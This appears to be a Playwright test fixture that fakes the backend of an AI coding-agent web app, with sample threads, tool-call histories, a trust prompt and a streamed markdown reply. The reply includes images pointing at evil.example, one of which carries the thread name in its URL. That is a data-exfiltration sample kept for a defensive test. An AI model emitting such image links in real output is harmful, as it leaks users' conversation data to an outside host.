import type {
  CredentialInfo,
  RawEvent,
  Remembered,
  Project,
  TaskInfo,
  ThreadSummary,
  TrustAsk,
} from '@glave/client';
import type { Page, Route } from '@playwright/test';

import {
  type Commands,
  SERVING,
  SERVING_HISTORY,
  STOP_MS,
  background,
  docsRunning,
} from './fake-commands';
import { type Awake, keptAwake } from './fake-awake';
import { keptFile } from './fake-files';
import { HOME, listFolders } from './fake-folders';
import { FakeLists } from './fake-lists';
import {
  type Gone,
  LOST,
  LOST_HISTORY,
  aboutGone,
  folderGone,
  listedGone,
  refusedTurn,
} from './fake-gone';
import { DEFAULT_MODEL, MODELS } from './fake-models';
import { Refusal, THREAD, bound, call, done, event } from './fake-records';
import { FAKE_SERVER, signIn } from './fake-signin';

/**
 * What the fake server knows: a project and the person's own project with their threads, one
 * thread's history (a turn on this computer that ran a command, edited a file and wrote a new
 * one, and replied from the default model, which the picker shows; how long it took and what
 * it cost), another waiting for the person to allow a push, the models, the tasks, one
 * memory, what a turn streams, the folders on the person's computer, and the projects made
 * while it runs; and when a test asks, a project that asks to be trusted, a thread that keeps
 * the docs site running in the background, and a connected GitHub account.
 */
const OWNER = { kind: 'person', id: '01900000-0000-7000-8000-0000000000aa' } as const;

function record(id: string, name: string, kind: Project['kind']): Project {
  return {
    id,
    kind,
    name,
    owner: OWNER,
    created_at: '2026-10-11T10:00:00.000Z',
    updated_at: '2026-10-11T10:00:00.000Z',
  };
}

export const PROJECT = record('01900000-0000-7000-8000-000000000001', 'glave', 'project');
export const PERSONAL = record('01900000-0000-7000-8000-000000000002', 'Personal', 'personal');

const TOKENS = { input: 1200, output: 300, cache_read: 0, cache_write: 0, reasoning: 0 };

function thread(
  id: string,
  title: string,
  status: ThreadSummary['status'] = 'idle',
  inProject = PROJECT,
  more: Partial<ThreadSummary> = {},
): ThreadSummary {
  return {
    id,
    project: inProject.id,
    status,
    standing: 'active',
    title,
    approval: 'auto',
    origin: { kind: 'web' },
    created_at: '2026-10-11T10:00:00.000Z',
    updated_at: '2026-10-11T10:05:00.000Z',
    turns: 1,
    tokens: TOKENS,
    ...more,
  };
}

/** A time after every fixture's: when a thread gets a message or a project is made meanwhile. */
const LATER = '2026-10-11T10:30:00.000Z';

export { THREAD };
export const NEW_THREAD = '01900000-0000-7000-8000-000000000102';
/** The thread that waits for the person: the oldest of the project's. */
export const WAITING = '01900000-0000-7000-8000-000000000103';
/** The thread an agent call in `THREAD` started. */
export const SUBAGENT = '01900000-0000-7000-8000-000000000109';

const THREADS: Readonly<Record<string, readonly ThreadSummary[]>> = {
  [PROJECT.id]: [
    thread(THREAD, 'Make the tests pass'),
    thread(SUBAGENT, 'Check the parser’s edge cases', 'idle', PROJECT, {
      parent: THREAD,
      updated_at: '2026-10-11T10:04:00.000Z',
    }),
    thread(WAITING, 'Review the release notes', 'waiting', PROJECT, {
      updated_at: '2026-10-11T10:01:00.000Z',
    }),
    thread('01900000-0000-7000-8000-000000000104', 'Nightly dependency audit', 'running', PROJECT, {
      updated_at: '2026-10-11T10:06:00.000Z',
    }),
  ],
  [PERSONAL.id]: [
    thread('01900000-0000-7000-8000-000000000105', 'Dinner ideas for Saturday', 'idle', PERSONAL),
  ],
};

export const HISTORY = [
  event(1, 'thread.started', {}),
  bound(2),
  event(3, 'turn.started', { model: { provider: 'e2e', name: DEFAULT_MODEL } }),
  event(4, 'message.added', {
    role: 'user',
    parts: [{ type: 'text', text: 'Make the tests pass' }],
  }),
  call(5, 'call_1', 'bash', { command: 'cargo test' }),
  done(6, 'call_1', 'test parse::empty ... FAILED'),
  call(7, 'call_2', 'edit', {
    path: 'src/parse.rs',
    old_string: 'fn parse(input: &str) -> Value {\n    input.parse().unwrap()\n}',
    new_string:
      'fn parse(input: &str) -> Option<Value> {\n    if input.is_empty() {\n        return None;\n    }\n    input.parse().ok()\n}',
  }),
  done(8, 'call_2', 'Edited src/parse.rs'),
  call(9, 'call_3', 'write', {
    path: 'tests/empty.rs',
    content: '#[test]\nfn empty_input_is_none() {\n    assert_eq!(parse(""), None);\n}\n',
  }),
  done(10, 'call_3', 'Wrote tests/empty.rs'),
  call(11, 'call_4', 'bash', { command: 'cargo test' }),
  done(12, 'call_4', 'test result: ok. 12 passed'),
  event(13, 'message.added', {
    role: 'assistant',
    parts: [
      {
        type: 'text',
        text: 'They pass now. parse() returned a value for empty input and unwrapped a failed parse; it now returns None for both, and a new test covers the empty case.',
      },
    ],
  }),
  event(14, 'model.responded', {
    model: { provider: 'e2e', name: DEFAULT_MODEL },
    stop: 'end_turn',
    cost: { amount: { micros: 4200, currency: 'USD' }, price_list: 'e2e' },
  }),
  event(15, 'turn.ended', { outcome: 'completed' }, THREAD, '2026-10-11T10:02:05.000Z'),
];

/** The waiting thread's history: it tidied a file and waits to push it. */
const WAITING_HISTORY = [
  event(1, 'thread.started', {}, WAITING),
  bound(2, WAITING),
  event(3, 'turn.started', { model: { provider: 'e2e', name: DEFAULT_MODEL } }, WAITING),
  event(
    4,
    'message.added',
    { role: 'user', parts: [{ type: 'text', text: 'Tidy the release notes and push them' }] },
    WAITING,
  ),
  call(
    5,
    'call_1',
    'edit',
    { path: 'docs/RELEASE.md', old_string: '- fixed stuff', new_string: '- Fixed the parser' },
    WAITING,
  ),
  done(6, 'call_1', 'Edited docs/RELEASE.md', WAITING),
  event(
    7,
    'message.added',
    { role: 'assistant', parts: [{ type: 'text', text: 'The notes are tidy. Ready to push.' }] },
    WAITING,
  ),
  call(8, 'call_2', 'bash', { command: 'git push -u origin docs/release-notes' }, WAITING),
  event(
    9,
    'approval.requested',
    {
      call_id: 'call_2',
      tool: 'bash',
      summary: 'bash: git push -u origin docs/release-notes',
      secret: false,
      caution: 'It pushes to a remote.',
    },
    WAITING,
  ),
];

/**
 * A project whose folder brings its own tools and settings, not trusted yet, and its thread,
 * which asks the person to trust them (`fakeApi`'s `trust`).
 */
const ACME = record('01900000-0000-7000-8000-000000000003', 'acme', 'project');
export const TRUSTING = '01900000-0000-7000-8000-000000000107';

/** What acme asks to be trusted, in the plain words the server sends. */
export const TRUST_ASK: TrustAsk = {
  ask: '5f2c9d0a1b7e4c3d8e6f0a9b2c1d4e7f5a8b3c6d9e0f1a2b4c7d8e9f0a1b2c3d',
  items: [
    { text: 'Runs a tool server', detail: 'npx @acme/mcp' },
    { text: 'Runs a hook before each command', detail: './scripts/check.sh' },
    { text: 'Lets glave approve actions without asking' },
    { text: 'Turns off the sandbox' },
  ],
};

/** The trusting thread's history: one exchange, before the project's tools are on. */
const TRUSTING_HISTORY = [
  event(1, 'thread.started', {}, TRUSTING),
  bound(2, TRUSTING),
  event(3, 'turn.started', { model: { provider: 'e2e', name: DEFAULT_MODEL } }, TRUSTING),
  event(
    4,
    'message.added',
    { role: 'user', parts: [{ type: 'text', text: 'Search the Acme docs for the release steps' }] },
    TRUSTING,
  ),
  event(
    5,
    'message.added',
    {
      role: 'assistant',
      parts: [
        {
          type: 'text',
          text: 'The Acme docs search is one of this project’s own tools, which are off until you trust the project.',
        },
      ],
    },
    TRUSTING,
  ),
  event(6, 'turn.ended', { outcome: 'completed' }, TRUSTING, '2026-10-11T10:00:04.000Z'),
];

/** Whether acme asks to be trusted, while the fake runs: until the person answers. */
interface Trust {
  asking: boolean;
}

/** The trusting thread as acme's lists and `thread/get` show it. */
function trusting(trust: Trust): ThreadSummary {
  const summary = thread(TRUSTING, 'Search the Acme docs', 'idle', ACME);
  return trust.asking ? { ...summary, status: 'waiting', trust: TRUST_ASK } : summary;
}

/** Each thread's history, by id. */
const HISTORIES: Readonly<Record<string, readonly RawEvent[]>> = {
  [THREAD]: HISTORY,
  [WAITING]: WAITING_HISTORY,
  [TRUSTING]: TRUSTING_HISTORY,
  [SERVING]: SERVING_HISTORY,
  [LOST]: LOST_HISTORY,
};

const TASKS: readonly TaskInfo[] = [
  {
    thread: '01900000-0000-7000-8000-000000000104',
    project: PROJECT.id,
    kind: 'agent',
    title: 'Nightly dependency audit',
    model: 'hope-12b',
    tokens: { ...TOKENS, input: 48200, output: 3100 },
    cost: { micros: 21500, currency: 'USD' },
    started_at: '2026-10-11T10:00:00.000Z',
    elapsed_ms: 754_000,
    status: 'running',
  },
  {
    thread: '01900000-0000-7000-8000-000000000106',
    project: PROJECT.id,
    kind: 'agent',
    title: 'Summarize open issues',
    model: DEFAULT_MODEL,
    tokens: TOKENS,
    cost: { micros: 4200, currency: 'USD' },
    started_at: '2026-10-11T09:00:00.000Z',
    elapsed_ms: 125_000,
    status: 'finished',
    outcome: 'completed',
  },
];

const MEMORIES: readonly Remembered[] = [
  {
    memory: '01900000-0000-7000-8000-000000000501',
    scope: 'personal',
    text: 'Prefers short answers',
    saved_at: '2026-10-11T10:00:00.000Z',
    version: 1,
  },
];

/** A GitHub account, connected when a test asks. */
const GITHUB: CredentialInfo = {
  id: '01900000-0000-7000-8000-000000000601',
  forge: 'github',
  url: 'https://github.com',
  login: 'ana',
  hint: 'wxyz',
  can: ['read', 'push'],
};

/** The repository the fake host does not have, which a clone fails on. */
export const MISSING_REPOSITORY = 'https://github.com/acme/missing';

/** How long a clone takes, so the page shows it under way. */
const CLONE_MS = 400;

/**
 * Makes a project as `project/create` does: a name taken among the person's projects gets the
 * next free one, and a repository the host does not have is refused with what git said.
 */
function makeProject(params: Record<string, unknown>, made: Project[]): unknown {
  const folder = params['folder'] as { kind: string; url?: string } | null | undefined;
  const url = folder?.url ?? '';
  if (folder?.kind === 'repository' && !/^https:\/\/[^/@]+\/./u.test(url)) {
    return new Refusal(
      -32602,
      `"${url}" is not a repository's address: give its https:// address, such as https://github.com/acme/app, with no user name or token in it`,
    );
  }
  if (folder?.kind === 'repository' && url === MISSING_REPOSITORY) {
    return new Refusal(
      -32025,
      `could not clone ${MISSING_REPOSITORY}: remote: Repository not found. If the repository is private, connect its git host first`,
    );
  }
  const asked = String(params['name']);
  const taken = new Set([PROJECT, ...made].map((each) => each.name.toLowerCase()));
  let name = asked;
  for (let next = 2; taken.has(name.toLowerCase()); next += 1) {
    name = `${asked} ${String(next)}`;
  }
  const id = `01900000-0000-7000-8000-${String(900 + made.length).padStart(12, '0')}`;
  const project = { ...record(id, name, 'project'), created_at: LATER };
  made.push(project);
  return { project: project };
}

/** A request the fake answered: its method and params. */
export interface Request {
  readonly method: string;
  readonly params: Record<string, unknown>;
}

/** A JSON-RPC message the fake sends. */
type Note = Readonly<Record<string, unknown>>;

/**
 * What a turn streams: the person's message, the reply growing piece by piece, then the reply
 * itself and the turn's result (answering call `id`).
 */
function turnNotes(
  target: string,
  prompt: string,
  pieces: readonly string[],
  id: number,
): readonly Note[] {
  const after = HISTORIES[target]?.length ?? 0;
  const added = (seq: number, role: string, text: string): Note => ({
    jsonrpc: '2.0',
    method: 'thread/event',
    params: {
      thread: target,
      event: event(seq, 'message.added', { role, parts: [{ type: 'text', text }] }, target),
    },
  });
  return [
    added(after + 1, 'user', prompt),
    ...pieces.map((text) => ({
      jsonrpc: '2.0',
      method: 'turn/live',
      params: { thread: target, update: { kind: 'text', text } },
    })),
    added(after + 2, 'assistant', pieces.join('')),
    {
      jsonrpc: '2.0',
      id,
      result: { turn: { outcome: 'completed', model_calls: 1, tool_calls: 0, tokens: TOKENS } },
    },
  ];
}

function turn(message: { id: number; params: Record<string, unknown> }): string {
  const notes = turnNotes(
    String(message.params['thread']),
    String(message.params['prompt']),
    ['Glad to ', 'help.'],
    message.id,
  );
  return notes.map((note) => `data: ${JSON.stringify(note)}\n\n`).join('');
}

/** What the person asks for a reply in markdown (`streamReply`). */
export const MARKDOWN_PROMPT = 'What changed?';

/**
 * A reply in markdown as a model writes it: a heading, a table, a task list, code, a link, and
 * two images that must never be fetched, one written in markdown and one in raw HTML.
 */
export const MARKDOWN_REPLY = [
  '## The parser is fixed',
  '',
  '`parse()` returned a value for **empty input** and unwrapped a failed parse; it now returns ' +
    '`None` for both. See [the issue](https://github.com/glave-ai/glave/issues/226).',
  '',
  '| Input | Before | After |',
  '| :---- | :----: | ----: |',
  '| `""` | panic | `None` |',
  '| `"12"` | `12` | `Some(12)` |',
  '',
  '- [x] Return `None` for empty input',
  '- [ ] Document the change',
  '',
  '```rust',
  'fn parse(input: &str) -> Option<Value> {',
  '    if input.is_empty() {',
  '        return None;',
  '    }',
  '    input.parse().ok()',
  '}',
  '```',
  '',
  '![Coverage by file](https://evil.example/chart.png?thread=make-the-tests-pass)',
  '',
  '<img src="https://evil.example/pixel.png">',
].join('\n');

/**
 * Makes the page's next turn stream `reply` to `THREAD` a few characters at a time, as a model
 * would: the page's own `fetch` answers `turn/start` with a stream that sends each piece on its
 * own, `delay` milliseconds apart, so the page renders the reply as it grows.
 */
export async function streamReply(page: Page, reply = MARKDOWN_REPLY, delay = 15): Promise<void> {
  const pieces = reply.match(/[\s\S]{1,6}/gu) ?? [];
  const notes = turnNotes(THREAD, MARKDOWN_PROMPT, pieces, 0);
  await page.addInitScript(
    ({ notes, delay }) => {
      const real = window.fetch.bind(window);
      window.fetch = async (input, init) => {
        const body = typeof init?.body === 'string' ? init.body : '';
        if (!body.includes('"turn/start"')) {
          return real(input, init);
        }
        const { id } = JSON.parse(body) as { id: number };
        const encoder = new TextEncoder();
        const stream = new ReadableStream<Uint8Array>({
          async start(controller) {
            for (const note of notes) {
              const message = 'result' in note ? { ...note, id } : note;
              controller.enqueue(encoder.encode(`data: ${JSON.stringify(message)}\n\n`));
              await new Promise((resolve) => setTimeout(resolve, delay));
            }
            controller.close();
          },
        });
        return new Response(stream, { headers: { 'Content-Type': 'text/event-stream' } });
      };
    },
    { notes, delay },
  );
}

/** What one fake server knows while it runs, beyond what never changes. */
interface Known {
  /** The threads started so far. */
  readonly started: ThreadSummary[];
  /** The projects made so far. */
  readonly made: Project[];
  /** Acme's ask, when the test has acme. */
  readonly trust: Trust | null;
  /** The serving thread's commands, when the test has it. */
  readonly commands: Commands | null;
  /** The git hosts the person connected. */
  readonly credentials: readonly CredentialInfo[];
  /** The threads given a message, which are then the latest. */
  readonly touched: Set<string>;
  /** Playground, whose folder is gone, when the test has it. */
  readonly gone: Gone | null;
  readonly awake: Awake;
}

/** The answer to a call that is not a turn. */
function answer(method: string, params: Record<string, unknown>, known: Known): unknown {
  const { started, made, trust, commands, credentials, touched, gone } = known;
  if (trust !== null) {
    const asked = trusted(method, params, trust);
    if (asked !== undefined) {
      return asked;
    }
  }
  const ran =
    background(method, params, commands) ??
    (gone === null ? undefined : aboutGone(method, params, gone));
  if (ran !== undefined) {
    return ran;
  }
  switch (method) {
    case 'file/upload':
      return keptFile(params);
    case 'project/list': {
      const lost = listedGone(gone);
      return { projects: [...made, ...lost.projects, PROJECT, PERSONAL], gone: lost.gone };
    }
    case 'project/create':
      return makeProject(params, made);
    case 'folder/list':
      return listFolders(typeof params['path'] === 'string' ? params['path'] : HOME);
    case 'thread/list': {
      const project = String(params['project']);
      const fresh = started.filter((each) => each.project === project);
      const serving =
        commands !== null && project === PROJECT.id ? [thread(SERVING, 'Preview the docs')] : [];
      const threads = [...fresh, ...serving, ...(THREADS[project] ?? [])];
      return {
        threads: threads.map((each) =>
          touched.has(each.id) ? { ...each, updated_at: LATER } : each,
        ),
      };
    }
    case 'thread/get':
      return { thread: thread(String(params['thread']), 'Make the tests pass') };
    case 'thread/events':
      return { events: HISTORIES[String(params['thread'])] ?? [] };
    case 'thread/start': {
      const inProject = params['project'] === PERSONAL.id ? PERSONAL : PROJECT;
      const fresh = thread(NEW_THREAD, '', 'idle', inProject);
      started.push(fresh);
      return { thread: fresh };
    }
    case 'thread/rename':
      return { thread: thread(String(params['thread']), String(params['title'])) };
    case 'model/list':
      return { models: MODELS };
    case 'tasks/list':
      return { tasks: TASKS };
    case 'schedule/list':
      return { schedules: [] };
    case 'memory/list':
      return { memories: MEMORIES };
    case 'provider/list':
      return {
        providers: [
          {
            id: '01900000-0000-7000-8000-000000000301',
            kind: 'openrouter',
            hint: 'a1b2',
            models: [],
          },
        ],
      };
    case 'credential/list':
      return { credentials, device: true };
    case 'server/discover':
      return {
        name: 'glave',
        version: '0.0.0',
        protocols: ['2026-10'],
        approval: 'auto',
        approvals: ['ask', 'auto'],
        id: FAKE_SERVER,
      };
    default:
      return signIn(method, params) ?? keptAwake(method, params, known.awake) ?? {};
  }
}

/** The answer to a call about acme, the project that asks to be trusted; else `undefined`. */
function trusted(method: string, params: Record<string, unknown>, trust: Trust): unknown {
  switch (method) {
    case 'project/list':
      return { projects: [ACME, PROJECT, PERSONAL] };
    case 'thread/list':
      return params['project'] === ACME.id ? { threads: [trusting(trust)] } : undefined;
    case 'thread/get':
      return params['thread'] === TRUSTING ? { thread: trusting(trust) } : undefined;
    case 'trust/answer':
      if (params['ask'] !== TRUST_ASK.ask || !trust.asking) {
        return new Refusal(-32026, 'this project changed since you were asked');
      }
      trust.asking = false;
      return { thread: trusting(trust) };
    default:
      return undefined;
  }
}

/**
 * Answers the session API's calls the app makes, as JSON-RPC over POST /. With `trust`, the
 * person also has acme, a project that asks to be trusted; with `commands`, a thread in the
 * project that keeps the docs site running in the background; with `account`, a GitHub account
 * connected; with `gone`, playground, a project whose folder isn't there anymore.
 */
export async function fakeApi(
  page: Page,
  {
    trust = false,
    commands = false,
    account = false,
    gone = false,
  }: {
    readonly trust?: boolean;
    readonly commands?: boolean;
    readonly account?: boolean;
    readonly gone?: boolean;
  } = {},
): Promise<{ readonly calls: readonly string[]; readonly requests: readonly Request[] }> {
  const calls: string[] = [];
  const requests: Request[] = [];
  const known: Known = {
    started: [],
    made: [],
    trust: trust ? { asking: true } : null,
    commands: commands ? docsRunning() : null,
    credentials: account ? [GITHUB] : [],
    touched: new Set(),
    gone: gone ? folderGone() : null,
    awake: { on: true },
  };
  const lists = new FakeLists((method, params) => answer(method, params, known));
  await page.route('**/*', async (route: Route) => {
    const request = route.request();
    if (request.method() !== 'POST') {
      await route.fallback();
      return;
    }
    const message = request.postDataJSON() as {
      id: number;
      method: string;
      params: Record<string, unknown>;
    };
    calls.push(message.method);
    requests.push({ method: message.method, params: message.params });
    // Nothing here changes a thread, so a watch is left waiting, as a quiet thread's is.
    if (message.method === 'thread/watch') {
      return;
    }
    if (message.method === 'thread/list/watch') {
      await lists.hold(route, message.id);
      return;
    }
    const turnStart = message.method === 'turn/start';
    const refused = turnStart ? refusedTurn(message.params, known.gone) : undefined;
    if (turnStart && refused === undefined) {
      known.touched.add(String(message.params['thread']));
      await route.fulfill({ contentType: 'text/event-stream', body: turn(message) });
      await lists.tell(String(message.params['thread']));
      return;
    }
    const folder = message.params['folder'] as { kind: string } | null | undefined;
    if (message.method === 'project/create' && folder?.kind === 'repository') {
      await new Promise((resolve) => setTimeout(resolve, CLONE_MS));
    }
    if (message.method === 'command/stop') {
      await new Promise((resolve) => setTimeout(resolve, STOP_MS));
    }
    const answered = refused ?? answer(message.method, message.params, known);
    const reply =
      answered instanceof Refusal
        ? { error: { code: answered.code, message: answered.message } }
        : { result: answered };
    await route.fulfill({
      contentType: 'application/json',
      body: JSON.stringify({ jsonrpc: '2.0', id: message.id, ...reply }),
    });
    if (message.method === 'trust/answer') {
      await lists.tell(String(message.params['thread']));
    }
  });
  return { calls, requests };
}
